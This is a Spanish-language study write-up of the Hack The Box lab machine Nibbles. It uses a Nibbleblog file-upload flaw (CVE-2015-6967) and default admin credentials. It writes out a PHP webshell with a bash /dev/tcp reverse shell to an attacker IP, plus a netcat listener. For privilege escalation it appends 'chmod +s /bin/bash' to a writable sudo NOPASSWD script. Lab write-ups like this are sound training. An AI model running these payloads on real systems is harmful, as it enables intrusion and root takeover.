| **Campo** | **Detalle** |
| -------------- | --------------------------------------------------------------------------------------------------------- |
| **Máquina** | Nibbles (Hack The Box) |
| **Autor** | Chema Marmol |
| **Fecha** | 05/07/2026 |
| **Dificultad** | Fácil / Media |
| **Temas** | CVE-2015-6967 (Nibbleblog File Upload) · Comentarios HTML · sudo NOPASSWD + script escribible · SUID bash |

| |
|---|
|ℹ **INFO**<br><br>Máquina clásica de HTB que encadena: descubrimiento vía comentario HTML →’ login por defecto en Nibbleblog →’ file upload (plugin My Image) →’ RCE →’ shell como nibbler →’ escalada via `sudo NOPASSWD` en script con permisos 777 →’ SUID en `/bin/bash`.|

# 1. Objetivos de la sesión

• Explotar **CVE-2015-6967** en Nibbleblog v4.0.3 (Arbitrary File Upload en plugin *My Image*).

• Usar **comentarios HTML** como vector de descubrimiento de rutas ocultas.

• Obtener **RCE** subiendo webshell PHP que el CMS acepta pese a warnings de imagen.

• Escalar privilegios vía **`sudo NOPASSWD` sobre script escribible** (`monitor.sh` 777) →’ `chmod u+s /bin/bash` →’ `bash -p`.

# 2. Conceptos clave

## 2.1. CVE-2015-6967 — Nibbleblog Arbitrary File Upload

**Nibbleblog v4.0.3** (codename *Coffee*, 2014) permite al administrador subir archivos a través del plugin **My Image**. La validación **no comprueba la extensión real**: acepta ficheros `.php` aunque muestre warnings de "error de imagen".

| Detalle | Valor |
| :--- | :--- |
| Plugin vulnerable | *My Image* |
| Endpoint de subida | `/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image` |
| Fichero resultante | `content/private/plugins/my_image/image.php` (ejecutable vía web) |
| Permisos resultantes | Usuario del servidor web (www-data / nibbler) |

> âœ“ **Clave** 
> Los **warnings de imagen no bloquean la subida**: el fichero PHP queda guardado y es ejecutable accediendo a su URL directa.

## 2.2. Comentarios HTML como vector de descubrimiento

Los comentarios HTML (`<!-- ... -->`) son visibles en el **código fuente** pero no se renderizan. Desarrolladores descuidados dejan:

- Rutas internas (`/nibbleblog/`, `/admin.php`)
- Versiones de CMS / frameworks
- Notas técnicas, TODOs, credenciales

> âœ“ **Regla** 
> **Siempre** `curl -s http://IP/ | grep -i "<!--"` o `Ver código fuente` en navegador. Es OSINT pasivo, no toca el servidor más que un GET normal.

## 2.3. `sudo NOPASSWD` sobre archivo escribible

Cuando `sudoers` permite ejecutar un script como root **sin contraseña** (`NOPASSWD`) y **ese script es escribible por el usuario actual**, el atacante puede:

1. Añadir comandos al final del script (`echo 'cmd' >> script.sh`).
2. Ejecutarlo con `sudo ./script.sh` →’ los comandos añadidos corren **como root**.

En Nibbles:
- Script: `/home/nibbler/personal/monitor.sh`
- Permisos: **777** (`rwxrwxrwx`) →’ escribible por `nibbler`.
- `sudo -l` muestra: `(root) NOPASSWD: /home/nibbler/personal/monitor.sh`

**Payload**: `echo 'chmod +s /bin/bash' >> monitor.sh` →’ `sudo ./monitor.sh` →’ `/bin/bash` queda con **SUID** →’ `bash -p` = root.

# 3. Kill Chain — Visión general

```
Nmap (full TCP) →’ curl (código fuente) →’ comentario HTML →’ /nibbleblog/
 →“
Gobuster en /nibbleblog/ →’ README →’ versión 4.0.3 →’ CVE-2015-6967
 →“
Login admin (admin:nibbles) →’ Plugin My Image →’ subida shell.php →’ image.php
 →“
Reverse shell (bash /dev/tcp) →’ listener nc →’ TTY upgrade (python3 pty)
 →“
Flag user →’ sudo -l →’ monitor.sh (777, NOPASSWD) →’ chmod +s /bin/bash
 →“
bash -p →’ root →’ flag root
```

# 4. Desarrollo técnico paso a paso

## 4.1. Escaneo completo

```bash
nmap -p- -sCV --min-rate 5000 <IP>
```

**Resultado**: solo **puerto 80 (HTTP)** y **22 (SSH)** abiertos.

## 4.2. Descubrimiento vía comentario HTML

```bash
curl -s http://<IP>/ | grep -i "<!--"
# O: curl -s http://<IP>/ | less (buscar manualmente)
```

**Salida** (fragmento):
```html
<!-- /nibbleblog/ - Nibbleblog installation -->
```

→’ Ruta oculta del CMS: **`/nibbleblog/`**

## 4.3. Enumeración de `/nibbleblog/`

```bash
gobuster dir -u http://<IP>/nibbleblog/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

**Hallazgos clave**:
- `admin.php` →’ panel de login
- `README` →’ confirma **Nibbleblog v4.0.3 (Coffee, 2014)** →’ vulnerable a **CVE-2015-6967**
- `content/private/plugins/my_image/` →’ directorio del plugin vulnerable

## 4.4. Login por defecto

Credenciales deducidas del nombre del CMS y la máquina:

| Usuario | Contraseña |
| :--- | :--- |
| `admin` | `nibbles` |

Acceso a `/nibbleblog/admin.php` →’ panel de administración.

## 4.5. Subida de webshell (Plugin My Image)

1. **Plugins** →’ **My Image** →’ **Configure**.
2. Crear `shell.php` en Kali:
 ```php
 <?php
 // Reverse shell bash via /dev/tcp
 exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.82/4444 0>&1'");
 ?>
 ```
 > **IP/puerto**: ajustar a tu Kali (`ip a` →’ tun0/eth0) y puerto libre (ej. 4444).
3. Subir `shell.php` como "imagen" en el plugin.
4. Nibbleblog muestra **warnings de error de imagen** pero **guarda el fichero** como:
 ```
 /nibbleblog/content/private/plugins/my_image/image.php
 ```

## 4.6. Ejecución de la reverse shell

**En Kali (listener)**:
```bash
nc -lvnp 4444
```

**En navegador / curl** (dispara la shell):
```bash
curl "http://<IP>/nibbleblog/content/private/plugins/my_image/image.php"
```

**Resultado**: conexión entrante en `nc` →’ shell como **nibbler** (usuario del servicio web).

## 4.7. Estabilización de la shell (TTY upgrade)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter Ã—2
export TERM=xterm
```

## 4.8. Flag de usuario y enumeración sudo

```bash
cd /home/nibbler
cat user.txt
# FLAG USER

sudo -l
```

**Salida `sudo -l`**:
```
User nibbler may run the following commands on Nibbles:
 (root) NOPASSWD: /home/nibbler/personal/monitor.sh
```

## 4.9. Análisis de `monitor.sh`

```bash
ls -la personal/
# personal.zip →’ descomprimir
unzip personal.zip
ls -la personal/monitor.sh
# -rwxrwxrwx 1 nibbler nibbler ... monitor.sh (777 !)
cat personal/monitor.sh
# Script simple, probablemente hace backup / monitorización
```

## 4.10. Escalada: inyectar SUID en bash

```bash
# Añadir comando al final (>> = append, NO > que sobreescribe)
echo 'chmod +s /bin/bash' >> personal/monitor.sh

# Ejecutar como root via sudo NOPASSWD
sudo ./personal/monitor.sh

# Verificar SUID
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash (s en owner = SUID)

# Shell root
bash -p
# whoami →’ root
cat /root/root.txt
# FLAG ROOT
```

> ⚠ **CRÍTICO** 
> Usar **`>>` (append)**, nunca `>` (sobrescribe). `>` destruye el script original y podrías romper la persistencia o alertar al admin. `>>` añade al final sin tocar lo anterior.

# 5. Herramientas utilizadas en la sesión

| Herramienta | Objetivo | Fase | Comando / Uso | Nivel | Notas |
| :--- | :--- | :--- | :--- | :--- | :--- |
| Nmap | Escaneo puertos + versiones | Reconocimiento | `nmap -p- -sCV --min-rate 5000 <IP>` | Recurrente | Solo 80 y 22 |
| curl / grep | Descubrir comentario HTML | Enum. pasiva | `curl -s http://IP/ | grep -i "<!--"` | Practicada | Descubrió `/nibbleblog/` |
| Gobuster | Enum. directorios en CMS | Enum. web | `gobuster dir -u http://IP/nibbleblog/ -w common.txt -x php,txt` | Practicada | README + admin.php |
| Nibbleblog (admin) | Login + file upload | Explotación | `admin:nibbles` →’ My Image plugin | Practicada | CVE-2015-6967 |
| Netcat (nc) | Listener reverse shell | Acceso | `nc -lvnp 4444` | Recurrente | Base de toda shell |
| bash /dev/tcp | Reverse shell payload | Explotación | `bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'` | Practicada | Sin dependencias externas |
| Python3 pty | TTY upgrade | Post-explotación | `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Practicada | 3 pasos clásicos |
| sudo -l | Enum. privilegios | Escalada | `sudo -l` | Recurrente | NOPASSWD en monitor.sh |
| unzip | Descomprimir personal.zip | Escalada | `unzip personal.zip` | Practicada | Script dentro |
| chmod / bash -p | SUID bash →’ root | Escalada final | `echo 'chmod +s /bin/bash' >> monitor.sh; sudo ./monitor.sh; bash -p` | Practicada | Patrón clásico |

# 6. Errores comunes y buenas prácticas

| |
|---|
|⚠ **AVISO**<br><br>**Comentarios HTML ≠  basura**. Son inteligencia pasiva gratis**. Siempre revisar `curl -s URL | grep "<!--"` o "Ver código fuente".|

| |
|---|
|⚠ **AVISO**<br><br>**File upload con warnings ≠  bloqueado**. Nibbleblog (y muchos CMS/plugins) muestran error de validación de imagen **pero guardan el fichero**. Verificar siempre accediendo a la URL resultante.|

| |
|---|
|⚠ **AVISO**<br><br>**`>>` vs `>` en escalada**. `>` sobrescribe y rompe el script legítimo. `>>` añade al final y preserva funcionalidad original. **Siempre `>>`**.|

| |
|---|
|âœ“ **BUENA PRÁCTICA**<br><br>**Credenciales por defecto / deducción**: `admin:admin`, `admin:nibbles`, `nibbler:nibbles`... Probar combinaciones obvias antes de fuerza bruta. Ahorra horas.|

| |
|---|
|âœ“ **BUENA PRÁCTICA**<br><br>**`sudo -l` en cada usuario nuevo**. Es el comando único que te dice "por dónde subir". Aquí reveló `monitor.sh` 777 + NOPASSWD.|

| |
|---|
|ℹ **Permisos 777 en script + sudo NOPASSWD = regalía de root**<br><br>Es una configuración errónea clásica: script de "monitorización/backup" que root ejecuta periódicamente (cron) o a demanda, pero dejó permisos abiertos. **Siempre revisar permisos de lo que sudo te deja tocar**.|

# 7. Conexión con sesiones anteriores

• **CVE-2015-6967 / File Upload**: mismo patrón que **Mr. Robot** (WP theme editor →’ 404.php) y **Oopsie** (IDOR →’ upload →’ webshell). La diferencia: aquí el CMS *es* el vector, no un plugin de WP.

• **Comentarios HTML**: visto en sesiones de enumeración web / OSINT (Reactor, Rockstar, enumeración web genérica).

• **Reverse shell bash /dev/tcp**: patrón recurrente (Oopsie, Archetype, Mr. Robot, Nike). No requiere `nc` ni `python` en la víctima.

• **TTY upgrade (python3 pty + stty)**: estándar en **todas** las máquinas Linux del máster desde HTB Starting Point.

• **sudo NOPASSWD + script escribible**: visto en **Banco** (`chattr` + cron), **Rockstar** (cron + SUID), **Nike** (logrotate/dd). Aquí es **script 777 + NOPASSWD** →’ inyección directa.

• **SUID bash + `bash -p`**: patrón maestro de escalada Linux (Nibbles, Oopsie, Archetype vía xp_cmdshell distinto, Mr. Robot nmap SUID, Reactor CDP →’ chmod u+s /bin/bash). **Dominar este patrón es obligatorio**.

# 8. Resumen del ataque

La máquina **Nibbles (HTB)** se resuelve en una cadena limpia:

1. **Reconocimiento pasivo**: `curl` + grep comentario HTML →’ descubre `/nibbleblog/`.
2. **Enumeración CMS**: Gobuster →’ `README` (v4.0.3) + `admin.php` →’ **CVE-2015-6967**.
3. **Acceso admin**: credenciales por defecto `admin:nibbles`.
4. **RCE via File Upload**: Plugin *My Image* acepta `shell.php` pese a warnings →’ guarda `image.php` ejecutable.
5. **Reverse shell**: payload `bash /dev/tcp` →’ listener `nc` →’ shell como `nibbler`.
6. **TTY upgrade** →’ shell usable.
7. **Flag user** + `sudo -l` →’ `monitor.sh` (777, NOPASSWD root).
8. **Inyección**: `echo 'chmod +s /bin/bash' >> monitor.sh` →’ `sudo ./monitor.sh`.
9. **Root**: `bash -p` →’ flag root.

Conceptos transversales: **descubrimiento pasivo**, **CVE clásico en CMS antiguo**, **file upload bypass validación**, **reverse shell pura bash**, **sudo NOPASSWD + escritura = root**, **SUID bash persistente**.

# 9. Checklist de repaso

☐ ¿Reviso **siempre** comentarios HTML (`curl | grep "<!--"`) en la home y páginas clave?

☐ ¿Sé identificar **Nibbleblog** y su versión vía `README` / `CHANGELOG` / `admin.php`?

☐ ¿Conozco el **CVE-2015-6967** (My Image plugin) y sé que los warnings **no bloquean** la subida?

☐ ¿Sé construir una **reverse shell bash** con `/dev/tcp` sin dependencias externas?

☐ ¿Hago **TTY upgrade** (pty →’ Ctrl+Z →’ stty raw -echo; fg) **siempre** tras reverse shell?

☐ ¿Ejecuto `sudo -l` **inmediatamente** tras conseguir usuario nuevo?

☐ ¿Detecto scripts **escribibles** con `NOPASSWD` en `sudo -l` y sé inyectar con `>>`?

☐ ¿Sé por qué **`bash -p`** mantiene euid=0 tras SUID en `/bin/bash`?

☐ ¿Distinguo `>>` (append, seguro) de `>` (sobrescribe, peligroso) en escaladas?

# 10. Actualización del registro de herramientas

Bloque copiable a la base de conocimiento del proyecto:

| Herramienta | Nivel | Cambio |
| :--- | :--- | :--- |
| Comentarios HTML (descubrimiento) | **Practicada** | Vector pasivo obligatorio en enum. web |
| Nibbleblog / CVE-2015-6967 | **Introducida** | File upload en plugin My Image →’ RCE |
| Reverse shell bash `/dev/tcp` | **Practicada** | Payload sin nc/python en víctima |
| sudo NOPASSWD + script 777 | **Practicada** | Escalada por inyección en script root |
| `bash -p` (SUID bash) | **Reforzada** | Patrón maestro escalada Linux |

---

**Fin de apuntes — Nibbles (HTB) · Chema Marmol · 05/07/2026**

→’

→’

→’


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes Andres/01.07.2026 Explotación Web WPScan File Upload y Reverse Shell en WordPress.md|01.07.2026 Explotación Web WPScan File Upload y Reverse Shell en WordPress]] — File Upload, Hydra, Metasploit
- [[../../apuntes Joselu/MODULO3/resumen_master_clase19.md|resumen_master_clase19]] — File Upload, Hydra, Metasploit
- [[../../write-ups/Academy-THL.md|Academy-THL]] — File Upload, GoBuster, Hydra
- [[../../apuntes Joselu/MODULO3/resumen_master_clase30.md|resumen_master_clase30]] — File Upload, Hydra, Metasploit
- [[../../informes/Informe_Academy.md|Informe_Academy]] — File Upload, Hydra, Metasploit
- [[../../transcripciones/Junio/05.06.2026 Hacking Web y Enumeración Completa Máquina Ridiculously Easy.md|05.06.2026 Hacking Web y Enumeración Completa Máquina Ridiculously Easy]] — File Upload, GoBuster, Hydra

### 🛠️ Herramientas

- [[comandos/GoBuster|GoBuster]]
- [[comandos/Hydra|Hydra]]
- [[comandos/Metasploit|Metasploit]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SSH|SSH]]
- [[comandos/WPScan|WPScan]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]

> #command-injection #escalada-privilegios #file-upload #gobuster #hack-the-box #hydra #idor #kali #linux #metasploit #netcat #nmap #osint #post-explotacion #redes #reverse-shell #ssh #wordpress #wpscan
